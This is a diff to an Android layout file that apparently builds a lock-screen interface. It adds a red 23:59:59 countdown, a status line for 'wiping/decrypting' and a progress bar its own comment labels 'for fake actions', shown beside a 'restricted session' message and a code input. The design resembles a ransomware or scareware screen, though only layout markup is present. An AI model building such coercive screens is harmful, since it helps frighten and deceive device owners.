@@ -55,6 +55,18 @@
             android:textStyle="bold"
             android:letterSpacing="0.08"/>
 
+        <!-- COUNTDOWN TIMER -->
+        <TextView
+            android:id="@+id/countdownTimer"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="15dp"
+            android:text="23:59:59"
+            android:textColor="#FF5555"
+            android:textSize="32sp"
+            android:textStyle="bold"
+            android:fontFamily="monospace"/>
+
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
@@ -62,6 +74,29 @@
             android:text="This device is currently in a restricted session."
             android:textColor="#AAA3B8"
             android:textSize="13sp"/>
+
+        <!-- STATUS TEXT FOR WIPING/DECRYPTING -->
+        <TextView
+            android:id="@+id/statusText"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="20dp"
+            android:text=""
+            android:textColor="#FF0000"
+            android:textSize="16sp"
+            android:textStyle="bold"
+            android:visibility="gone"/>
+
+        <!-- PROGRESS BAR FOR FAKE ACTIONS -->
+        <ProgressBar
+            android:id="@+id/actionProgressBar"
+            style="?android:attr/progressBarStyleHorizontal"
+            android:layout_width="match_parent"
+            android:layout_height="10dp"
+            android:layout_marginTop="10dp"
+            android:progressTint="#FF0000"
+            android:progressBackgroundTint="#30243E"
+            android:visibility="gone"/>
 
         <EditText
             android:id="@+id/authInput"
